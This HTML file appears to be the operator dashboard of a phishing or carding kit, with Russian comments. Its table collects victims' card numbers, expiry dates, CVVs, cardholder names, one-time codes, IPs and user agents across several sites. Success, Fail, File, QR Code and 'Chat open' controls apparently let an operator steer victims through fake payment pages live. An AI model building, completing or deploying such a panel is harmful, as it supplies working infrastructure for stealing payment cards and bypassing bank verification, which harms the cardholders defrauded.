<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body class="dark-theme">
    <div class="container">
        <header>
            <h1>Admin Panel</h1>
            <div class="actions">
                <button id="refreshBtn">Refresh</button>
                <div class="dropdown">
                    <button class="dropdown-btn">Actions</button>
                    <div class="dropdown-content">
                        <a href="#" id="successBtn">Success</a>
                        <a href="#" id="failBtn">Fail</a>
                        <a href="#" id="fileBtn">File</a>
                        <a href="#" id="qrBtn">QR Code</a>
                        <a href="#" id="chatBtn">Chat open</a>
                    </div>
                </div>
            </div>
        </header>

        <!-- Модальное окно для QR-кодов -->
        <div id="qrModal" class="modal">
            <div class="modal-content">
                <span class="close">&times;</span>
                <h2>QR Code Management</h2>
                <div class="qr-container">
                    <div class="qr-section">
                        <h3>Site 1 QR Code</h3>
                        <img id="qr1" src="/qr/1" alt="QR Code 1" onerror="this.src='placeholder.png'">
                        <input type="file" id="qr1Upload" accept="image/*">
                        <button onclick="uploadQR(1)">Upload New QR</button>
                    </div>
                    <div class="qr-section">
                        <h3>Site 2 QR Code</h3>
                        <img id="qr2" src="/qr/2" alt="QR Code 2" onerror="this.src='placeholder.png'">
                        <input type="file" id="qr2Upload" accept="image/*">
                        <button onclick="uploadQR(2)">Upload New QR</button>
                    </div>
                    <div class="qr-section">
                        <h3>Site 3 QR Code</h3>
                        <img id="qr3" src="/qr/3" alt="QR Code 3" onerror="this.src='placeholder.png'">
                        <input type="file" id="qr3Upload" accept="image/*">
                        <button onclick="uploadQR(3)">Upload New QR</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Основная таблица -->
        <table id="dataTable">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>CC Num</th>
                    <th>Exp</th>
                    <th>CVV</th>
                    <th>CardHolder</th>
                    <th>Code</th>
                    <th>Site</th>
                    <th>IP</th>
                    <th>UA</th>
                    <th>Referer</th>
                </tr>
            </thead>
            <tbody id="tableBody">
            </tbody>
        </table>
    </div>

    <script src="admin.js"></script>
</body>

</html>
